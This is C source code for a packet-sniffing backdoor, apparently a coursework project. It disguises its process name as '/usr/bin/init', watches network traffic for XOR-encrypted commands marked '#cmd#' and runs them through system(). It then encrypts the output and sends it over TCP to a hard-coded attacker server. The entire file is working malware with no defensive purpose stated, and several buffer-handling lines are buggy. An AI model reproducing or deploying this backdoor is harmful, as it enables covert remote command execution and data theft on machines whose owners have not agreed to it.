#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <strings.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <pcap.h>
#include <stdlib.h>
#include <netinet/ip.h> 
#include <sys/prctl.h>
#include <netdb.h>

#define CODE "#cmd#"
#define KEY "8505"
#define BUFSIZE 10000
#define BUFLEN 80
#define OUTPUTFILE "output.backdoor"
#define INFINITY 0
#define PROCESS_NAME "/usr/bin/init"
#define SERVER_PORT 8000
#define ATTACKER_SERVER "192.168.0.10"

/*
Packet Sniffer Backdoor

Coded by: Miguel Oloresisimo A00752874
		  
This program will:
-request a user input from the user for the filter to use for packet capturing
-mask the process with a new name to camouflage with the process table
-use libpcap library to capture traffic from a network device
-decrypt the command data sent by the attacker's client
-execute the command sent by the attacker's client
-encrypt the command results
-establish a TCP connection to the attacker to send the encrypted command execution results
*/

void decrypt_command(char *encryptedcommand, int length);
void packet_sniffer(char *filter);
void pkt_analyze();
void change_process_name(char *process, char *name, size_t length);
void send_output();

int main(int argc, char **argv)
{
	char filter[BUFSIZE];

	// Erase the old name so that it won't overlap the new name
	memset(argv[0], '\0', strlen(argv[0]));
	// Apply new name to the program
	strcpy(argv[0], PROCESS_NAME);
	// Set new name in the process table
	prctl(PR_SET_NAME,PROCESS_NAME,0,0);

	// Get the filter for capturing packets
	printf("ENTER THE FILTER YOU WANT TO USE FOR CAPTURING PACKETS ON THE BACKDOOR: \n");
	fgets(filter, BUFSIZE, stdin);

	// Start capturing from a network interface and loop to analyze packets for backdoor
	packet_sniffer(filter);
	return 0;
}

void packet_sniffer(char *filter)
{
	char *nic_dev; 
    	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t* nic_descr;
    	struct bpf_program fp;      // holds compiled program     
    	bpf_u_int32 maskp;          // subnet mask               
    	bpf_u_int32 netp;           // ip                        
    	u_char* args = NULL;

	// find the first NIC that is up and sniff packets from it    	
	nic_dev = pcap_lookupdev(errbuf); //assign device name if you want to select the device manually
    	if (nic_dev == NULL)
    	{ 
		printf("%s\n",errbuf); 
		exit(1);
	}

    	// Use pcap to get the IP address and subnet mask of the device 
    	pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);

    	// open the device for packet capture & set the device in promiscuous mode 
    	nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
    	if (nic_descr == NULL)
    	{ 
		printf("pcap_open_live(): %s\n",errbuf); 
		exit(1); 
	}

	// Compile the filter expression
	if (pcap_compile (nic_descr, &fp, filter, 0, netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1);
	}

	// Load the filter into the capture device
	if (pcap_setfilter(nic_descr, &fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}
    	// Start the capture session 
    	pcap_loop (nic_descr, INFINITY, pkt_analyze, args);

    	fprintf(stdout,"\nCapture Session Done\n");
}

void pkt_analyze(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
	char *cmd;
	char *command = malloc(sizeof(pkthdr));

	//Check to see if it is a UDP packet with a payload
	if ((pkthdr->caplen <= 42))
		return;

	//Point to the payload of the packet
	cmd = (char *)(packet + 42);

	//Check to see if this packet is meant for the backdoor by seeing if the payload contains the code
	if((strstr(cmd, CODE)) == NULL)
		return;
    	
	//Move pointer to the encrypted command
	cmd = cmd + 5;

	//Decrypt command from the payload
	decrypt_command(cmd, sizeof(cmd));

	//Make the command contain strings that will make it output to a file
	sprintf(command, "%s > %s", cmd, OUTPUTFILE);
	printf("Command: %s\n", command);

	//Execute the command
	system(command);
	
	// Wait 3 seconds before establishing connection
	sleep(3);
	send_output();
}

void decrypt_command(char *encryptedcommand, int length)
{
	int i=0, key_count=0;
	char *key = KEY;

	// decrypt the command from the payload
	while(encryptedcommand[i] != '\n')
	{
		encryptedcommand[i] = encryptedcommand[i] ^ key[key_count++];	
		i++;
		if(key_count == strlen(key))
			key_count = 0;
	}
	//Turn newline character at the end of the command to null
	encryptedcommand[i] = '\0';
}

void send_output()
{
	FILE* fp;
	int i=0, key_count=0, sd;
	char buffer[BUFLEN];
	char *key = KEY;
	char str[16];
	int n, bytes_to_read;
	struct hostent	*hp;
	struct sockaddr_in server;
	char  *host, *bp, rbuf[BUFLEN], sbuf[BUFLEN], **pptr, *sptr;
	host = ATTACKER_SERVER;
	printf("sending output\n");
	// Create the socket
	if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror("Cannot create socket");
		exit(1);
	}
	bzero((char *)&server, sizeof(struct sockaddr_in));
	server.sin_family = AF_INET;
	server.sin_port = htons(SERVER_PORT);
	if ((hp = gethostbyname(host)) == NULL)
	{
		fprintf(stderr, "Unknown server address\n");
		exit(1);
	}
	bcopy(hp->h_addr, (char *)&server.sin_addr, hp->h_length);

	// Connecting to the attacker's machine
	if (connect (sd, (struct sockaddr *)&server, sizeof(server)) == -1)
	{
		fprintf(stderr, "Can't connect to server\n");
		perror("connect");
		exit(1);
	}
	printf("Connected:    Server Name: %s\n", hp->h_name);
	pptr = hp->h_addr_list;
	printf("\t\tIP Address: %s\n", inet_ntop(hp->h_addrtype, *pptr, str, sizeof(str)));
	printf("\nEncrypted Data to be sent:\n");
	// Open the file containing the output of the command
	if((fp=fopen(OUTPUTFILE, "rb")) != NULL)
	{
		while(1)
		{
			int bytes_read = fread(buffer, sizeof(char), BUFLEN, fp);
			if(bytes_read == 0)
				break;
			// XOR encrypt the data in the file
			while(i < bytes_read)
			{
				buffer[i] = buffer[i++] ^ key[key_count++];		
				if(key_count == strlen(key))
					key_count = 0;
			}	
			
			void *p=buffer;
			// Send encrypted data to the attacker's machine			
			while(bytes_read > 0)
			{
				printf("%s\n", buffer);
				int bytes_written = write(sd, buffer, bytes_read);
				if (bytes_written <= 0)
					perror("written error\n");
				bytes_read -= bytes_written;
				p+=bytes_written;
			}	
			i=0;
			key_count=0;	
		}
		fclose(fp);
	}
	close (sd);
}